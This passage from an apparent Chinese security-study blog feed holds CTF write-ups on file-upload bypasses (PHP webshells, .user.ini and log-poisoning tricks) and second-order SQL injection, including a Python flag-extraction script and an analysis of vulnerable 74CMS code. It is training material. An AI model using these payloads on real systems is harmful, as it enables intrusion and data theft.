../flagaa.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">169</span> <span class="number">170</span>日志包含</span><br><span class="line">    构造.user.ini利用的两个条件：</span><br><span class="line">        <span class="number">1</span>.index.php ==&gt; 上传index.php 内容随意</span><br><span class="line">        <span class="number">2</span>.php7.x</span><br><span class="line">    </span><br><span class="line">    解题：</span><br><span class="line">    <span class="number">1</span>.上传index.php，内容随意。</span><br><span class="line">    <span class="number">2</span>.上传.user.ini包含日志：</span><br><span class="line">        auto_prepend_file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">    <span class="number">3</span>.访问url/upload查看是不是有日志，生效后再做下面的尝试。</span><br><span class="line">        随便访问个地址，把后门写入UA头：<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br><span class="line">        后台记录后等同于写入了日志，访问/upload+post操作即可</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0022-WEB攻防-13-通用漏洞之文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性</title>
      <link href="/2023/06/13/SEC-Study-0050/"/>
      <url>/2023/06/13/SEC-Study-0050/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、文件上传-前端验证<br>2、文件上传-黑白名单<br>3、文件上传-user.ini妙用(受环境限制)<br>4、文件上传-PHP语言特性</p><p>部分不是通用的，但是思路相同，关键点在于环境差异，解决形式略微不同。</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="详细点："></a>详细点：</h2><p>1、检测层面：前端，后端等</p><p>2、检测内容：文件头，完整性，二次渲染等</p><p>3、检测后缀：黑名单，白名单，MIME(文件类型)检测等</p><p>4、绕过技巧：多后缀解析(如.php.jpg)，截断，中间件特性(可能导致过滤代码失效)，条件竞争等</p><h2 id="本章课程内容："><a href="#本章课程内容：" class="headerlink" title="本章课程内容："></a>本章课程内容：</h2><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p><h1 id="实践：CTFSHOW-文件上传-151到161关卡"><a href="#实践：CTFSHOW-文件上传-151到161关卡" class="headerlink" title="实践：CTFSHOW-文件上传-151到161关卡"></a>实践：CTFSHOW-文件上传-151到161关卡</h1><h2 id="前置："><a href="#前置：" class="headerlink" title="前置："></a>前置：</h2><p>后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)<br>如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门<br>文件上传主要是上传PHP文件，让后台去使用PHP文件。<br>解析什么后缀的文件就上传什么样的后门代码。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>文件上传的思路：配合文件上传，把后门上传上去，获取后端权限。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">151</span> <span class="number">152</span>-JS验证+MIME</span><br><span class="line">Content-Type: image/png</span><br><span class="line"><span class="number">1</span>.前端验证时，通过修改前端的js进行绕过</span><br><span class="line">    一句话木马：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br><span class="line">    连接文件并且传入POST参数x：</span><br><span class="line">        x=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">        x=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls ../&#x27;</span>);</span><br><span class="line">        x=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.MIME验证：数据包字段，通过文件后缀检查文件格式。</span><br><span class="line">    和上题一样，修改前端验证，上传php，再改掉数据包的MIME即可。</span><br><span class="line">    后台认证的文件格式就是MIME</span><br><span class="line">    Content-Type: image/png</span><br><span class="line"></span><br><span class="line">    上两题的前提都是对方服务器的文件名只在前台进行认证。</span><br><span class="line"><span class="comment">// 两个小点成功的基础：传入后端的php能被执行/解析</span></span><br><span class="line"><span class="comment">// 一般网站是php网站，就上传1.php的后门代码1进行入侵</span></span><br><span class="line"><span class="comment">// 根据网站脚本语言决定文件上传文件的格式。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">153</span>-JS验证+user.ini</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/NineOne/p/14033391.html</span></span><br><span class="line">    上传.user.ini,将文件包含进index.php</span><br><span class="line">        .user.ini：auto_prepend_file=test.png</span><br><span class="line">    上传木马png，访问对应目录下的index.php,得到flag</span><br><span class="line">        test.png：<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">// 利用的条件：.user.ini ,index.php调用.user.ini(使.user.ini生效)</span></span><br><span class="line">    <span class="comment">// .user.ini是php防跨站目录访问的文件配置，里面放的是你网站的文件夹路径地址。</span></span><br><span class="line"></span><br><span class="line"><span class="number">154</span> <span class="number">155</span>-JS验证+user.ini+短标签</span><br><span class="line">    内容检测:当检测到<span class="meta">&lt;?php</span> 这种头部时，阻止文件上传。</span><br><span class="line">    <span class="number">1</span>.换后门</span><br><span class="line">    <span class="number">2</span>.换一种php写法</span><br><span class="line">        <span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>                                          <span class="comment">//前提是开启配置参数short_open_tags=on</span></span><br><span class="line">        &lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;                                          <span class="comment">//前提是开启配置参数asp_tags=on</span></span><br><span class="line">        <span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>                                              <span class="comment">//不需要开启参数设置</span></span><br><span class="line">        &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>; &lt;/script&gt;                <span class="comment">//不需要修改参数开关</span></span><br><span class="line">    完成内容检测的绕过后，就可以按照上面的方法传入后门了。</span><br><span class="line">    .user.ini：auto_prepend_file=test.png</span><br><span class="line">    test.png：<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br><span class="line">    浏览器POST：x=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">156</span> JS验证+user.ini+短标签+过滤</span><br><span class="line">    .user.ini使用的是php函数</span><br><span class="line">    符号过滤，过滤掉了POST的方括号。</span><br><span class="line">    .user.ini：auto_prepend_file=test.png</span><br><span class="line">    test.png：<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;x&#125;);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">157</span> <span class="number">158</span> <span class="number">159</span> JS验证+user.ini+短标签+过滤</span><br><span class="line">    过滤了分号和其它符号。正则表达式过滤。</span><br><span class="line">    直接写函数读取flag，省略分号。</span><br><span class="line">    使用反引号      运算符的效果与函数 <span class="title function_ invoke__">shell_exec</span>()相同</span><br><span class="line">    .user.ini：auto_prepend_file=test.png</span><br><span class="line">    <span class="comment">// 正则表达式查文件绕过特殊符号</span></span><br><span class="line">    test.png：<span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../fl*&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">// 这是括号被过滤的情况</span></span><br><span class="line">    test.png：<span class="meta">&lt;?</span> <span class="keyword">echo</span> `tac /<span class="keyword">var</span>/www/html/f*`<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">160</span> JS验证+user.ini+短标签+过滤</span><br><span class="line">    包含默认日志，日志记录UA头，UA头写后门代码(nginx)</span><br><span class="line">    尝试把东西写到日志记录文件</span><br><span class="line">    .user.ini：auto_prepend_file=test.png</span><br><span class="line">    <span class="comment">// php的点连接，防止php过滤日志性质文件</span></span><br><span class="line">    test.png：<span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">    访问时，把UA头替换为后门代码，访问日志文件时使用POST参数，最后使用日志展示出对应的目标信息。</span><br><span class="line"></span><br><span class="line"><span class="number">161</span> JS验证+user.ini+短标签+过滤+文件头</span><br><span class="line">    文件头部检测是否为图片格式文件</span><br><span class="line">    .user.ini：GIF89A auto_prepend_file=test.png</span><br><span class="line">    test.png：GIF89A <span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0021-WEB攻防-12-通用漏洞之SQL数据库-二次/堆叠/DNS</title>
      <link href="/2023/06/11/SEC-Study-0049/"/>
      <url>/2023/06/11/SEC-Study-0049/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>1、数据库堆叠注入</p><ul><li>根据数据库类型决定是否支持多条语句执行</li></ul><p>2、数据库二次注入</p><ul><li>应用功能逻辑涉及上导致的先写入后组合的注入</li></ul><p>3、数据库Dnslog注入</p><ul><li>解决不回显(反向连接),SQL注入,命令执行,SSRF等</li></ul><p>4、黑盒模式分析以上</p><ul><li>二次注入：插入后调用显示操作符合</li><li>堆叠注入：判断注入后直接调多条执行</li><li>DNS注入：在注入上没太大利用价值，其他还行</li></ul><h1 id="知识点展开"><a href="#知识点展开" class="headerlink" title="知识点展开"></a>知识点展开</h1><h2 id="二次注入-74CMS-amp-网鼎杯2018Unfinish-★★★"><a href="#二次注入-74CMS-amp-网鼎杯2018Unfinish-★★★" class="headerlink" title="二次注入-74CMS&amp;网鼎杯2018Unfinish ★★★"></a>二次注入-74CMS&amp;网鼎杯2018Unfinish ★★★</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">找回密码的逻辑：</span><br><span class="line">点击找回密码-&gt;抓到用户名-&gt;使用指定用户名(目标)找回密码</span><br><span class="line">(绕过登录验证，直接以某目标为准找密码)-&gt;一般网站-&gt;直接update更新指定用户数据</span><br><span class="line">update如果写入的是一个SQL注入……</span><br><span class="line">update user set password=xiaosedi where username=<span class="string">&#x27;sql注入代码&#x27;</span></span><br><span class="line">在存入的数据当中写入恶意执行代码并且存入数据库，造成代码的二次读取生效。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二次注入的原理：</span><br><span class="line">    插入恶意数据--&gt;引用恶意数据</span><br><span class="line">    在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，</span><br><span class="line">    在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</span><br><span class="line">    个人理解：存入不生效，取出即生效(代码功能)</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="CTF-网鼎杯2018-Unfinish-黑盒"><a href="#CTF-网鼎杯2018-Unfinish-黑盒" class="headerlink" title="CTF-[网鼎杯2018]Unfinish-黑盒"></a>CTF-[网鼎杯2018]Unfinish-黑盒</h3><p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF2018]Unfinish">题目点我</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.第一个坑：进去只看到一个登录界面，需要自己手动切换到注册界面。（惯性思维，以为会有快捷方式）</span><br><span class="line">    http:<span class="comment">//33fb5085-b7d7-4a88-85e6-4a0900af8cab.node4.buuoj.cn:81/register.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.注册完成后，默认跳到登录界面</span><br><span class="line">    <span class="number">1</span>.注册信息为：邮箱，用户名，密码</span><br><span class="line">    <span class="number">2</span>.注册完成后默认转到登录页面</span><br><span class="line">    <span class="number">3</span>.登录进去默认左侧的箭头点开进去会有个用户名和头像的展示</span><br><span class="line">    =&gt; 也就是说，用户名会默认插入页面，展示在左边。</span><br><span class="line">    =&gt; 只要能修改这个点，就能实现二次注入。</span><br><span class="line">    ==&gt; 二次注入的办法就在于：把用户名作为注入的点进行注入。</span><br><span class="line">    因为是黑盒，所以猜测</span><br><span class="line">        <span class="number">1</span>.注册的代码为：  </span><br><span class="line">            insert into <span class="title function_ invoke__">user</span> (username,email,password)<span class="title function_ invoke__">VALUES</span>(<span class="string">&#x27;sywsec@qq.com&#x27;</span>,<span class="string">&#x27;sywsec&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">        <span class="number">2</span>.进入用户界面时，取出用户名</span><br><span class="line">            select username <span class="keyword">from</span> user where email=<span class="string">&#x27;sywsec@qq.com&#x27;</span>;</span><br><span class="line">    把攻击语句写入到用户名，获取攻击语句注入后再取出来时，形成sql注入攻击</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/fmyyy1/article/details/115733073">参考博客1</a><br><a href="https://mayi077.gitee.io/2020/08/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish/">参考博客2</a></p><p>这里套用大佬的Py代码解决爆flag的问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span></span><br><span class="line"><span class="comment"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://33fb5085-b7d7-4a88-85e6-4a0900af8cab.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    url1 = url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">    url2 = url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        sleep(<span class="number">0.3</span>)<span class="comment">#不加sleep就429了QAQ</span></span><br><span class="line">        data1 = &#123;<span class="string">&quot;email&quot;</span> : <span class="string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;username&quot;</span> : <span class="string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">        data2 = &#123;<span class="string">&quot;email&quot;</span> : <span class="string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>,r2.text)</span><br><span class="line">        res1 = re.search(<span class="string">r&#x27;\d+&#x27;</span>, res.group())</span><br><span class="line">        flag = flag+<span class="built_in">chr</span>(<span class="built_in">int</span>(res1.group()))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;final:&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    search()</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------flag如下-------- #</span></span><br><span class="line">flag&#123;a56fb7e0-40a5-<span class="number">4296</span>-82d7-4e208353d6b3&#125; </span><br></pre></td></tr></table></figure><h3 id="CMS-74CMS个人会员中心-黑白盒"><a href="#CMS-74CMS个人会员中心-黑白盒" class="headerlink" title="CMS-74CMS个人会员中心-黑白盒"></a>CMS-74CMS个人会员中心-黑白盒</h3><p>骑士CMS的个人中心简历的二次注入漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">黑盒测试：</span><br><span class="line">    在个人中心-&gt;创建个人简历-&gt;教育经历-&gt;学校名称处，插入如下代码进行注入</span><br><span class="line">    xiaosedi<span class="string">&#x27;,address=user()#</span></span><br><span class="line"><span class="string">    查看该简历时，</span></span><br><span class="line"><span class="string">        联系的地址替换为了：root@localhost</span></span><br><span class="line"><span class="string">        学校名称处：xiaosedi&#x27;</span>,address=<span class="title function_ invoke__">user</span>()<span class="comment">#</span></span><br><span class="line">        通过这种方式控制了联系地址的展示我们需要的单个信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">白盒测试</span><br><span class="line">    抓包发现地址后面出现：save_resume_education_edit</span><br><span class="line">    找到save_resume_education_edit的位置</span><br><span class="line">        <span class="comment">//保存修改的教育经历</span></span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$act</span>==<span class="string">&#x27;save_resume_education_edit&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$id</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;参数错误！&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;start&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;start&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;start&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写开始时间！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;endtime&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;endtime&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;endtime&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写结束时间！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;school&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;school&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;school&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写学校名称！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;speciality&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;speciality&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;speciality&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写专业名称！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;education&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;education&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;education&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请选择获得学历！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;education_cn&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;education_cn&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;education_cn&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请选择获得学历！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">updatetable</span>(<span class="title function_ invoke__">table</span>(<span class="string">&#x27;resume_education&#x27;</span>),<span class="variable">$setsqlarr</span>,<span class="string">&quot; id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; AND uid=&#x27;<span class="subst">&#123;$_SESSION[&#x27;uid&#x27;]&#125;</span>&#x27;&quot;</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;go_resume_show&#x27;</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?act=resume_show&amp;pid=<span class="subst">&#123;$_REQUEST[&#x27;pid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$link</span>[<span class="number">0</span>][<span class="string">&#x27;text&#x27;</span>] = <span class="string">&quot;返回上一页&quot;</span>;</span><br><span class="line">                        <span class="variable">$link</span>[<span class="number">0</span>][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&quot;?act=make4&amp;pid=<span class="subst">&#123;$_REQUEST[&#x27;pid&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">                        <span class="title function_ invoke__">check_resume</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>],<span class="title function_ invoke__">intval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]));</span><br><span class="line">                        <span class="title function_ invoke__">showmsg</span>(<span class="string">&quot;修改成功！&quot;</span>,<span class="number">2</span>,<span class="variable">$link</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                <span class="title function_ invoke__">showmsg</span>(<span class="string">&quot;保存失败！&quot;</span>,<span class="number">0</span>,<span class="variable">$link</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    还有一种是新创建的make4，也就是新创建简历时的代码：</span><br><span class="line">        <span class="comment">//创建简历-保存教育经历</span></span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$act</span>==<span class="string">&#x27;make4_save&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$resume_education</span>=<span class="title function_ invoke__">get_resume_education</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>],<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$resume_education</span>)&gt;=<span class="number">6</span>) <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;教育经历不能超过6条！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;uid&#x27;</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>]);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;pid&#x27;</span>]=<span class="title function_ invoke__">intval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$setsqlarr</span>[<span class="string">&#x27;uid&#x27;</span>]==<span class="number">0</span> || <span class="variable">$setsqlarr</span>[<span class="string">&#x27;pid&#x27;</span>]==<span class="number">0</span> ) <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;参数错误！&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;start&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;start&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;start&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写开始时间！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;endtime&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;endtime&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;endtime&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写结束时间！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;school&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;school&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;school&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写学校名称！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;speciality&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;speciality&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;speciality&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请填写专业名称！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;education&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;education&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;education&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请选择获得学历！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$setsqlarr</span>[<span class="string">&#x27;education_cn&#x27;</span>]=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;education_cn&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;education_cn&#x27;</span>]:<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请选择获得学历！&#x27;</span>,<span class="number">1</span>,<span class="variable">$link</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">inserttable</span>(<span class="title function_ invoke__">table</span>(<span class="string">&#x27;resume_education&#x27;</span>),<span class="variable">$setsqlarr</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="title function_ invoke__">check_resume</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;uid&#x27;</span>],<span class="title function_ invoke__">intval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]));</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;go_resume_show&#x27;</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?act=resume_show&amp;pid=<span class="subst">&#123;$setsqlarr[&#x27;pid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="variable">$link</span>[<span class="number">0</span>][<span class="string">&#x27;text&#x27;</span>] = <span class="string">&quot;继续添加教育经历&quot;</span>;</span><br><span class="line">                    <span class="variable">$link</span>[<span class="number">0</span>][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;?act=make4&amp;pid=&#x27;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">                    <span class="variable">$link</span>[<span class="number">1</span>][<span class="string">&#x27;text&#x27;</span>] = <span class="string">&quot;跳到下一步&quot;</span>;</span><br><span class="line">                    <span class="variable">$link</span>[<span class="number">1</span>][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;?act=make5&amp;pid=&#x27;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">                    <span class="variable">$link</span>[<span class="number">2</span>][<span class="string">&#x27;text&#x27;</span>] = <span class="string">&quot;查看我的教育经历&quot;</span>;</span><br><span class="line">                    <span class="variable">$link</span>[<span 